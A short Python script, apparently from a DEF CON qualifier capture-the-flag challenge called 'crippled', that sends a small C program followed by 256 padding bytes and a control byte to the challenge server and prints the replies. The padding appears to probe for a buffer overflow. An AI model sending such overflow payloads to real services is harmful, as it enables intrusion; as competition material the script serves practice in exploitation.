#!/usr/bin/env python
import sys
from chdrft.tube.connection import Connection

data=b'''
int main()
{
   write(1, "hi", 2);
}
'''
data+= b'a'*256
data+=b'\n'
data+=b'\x03'

with Connection('crippled_f7fddee5e137122934909141e7d3f728.quals.shallweplayaga.me', 11111) as c:
  c.send(data)
  print(c.recv(1024))
  print(c.recv(1024))
  print(c.recv(1024))

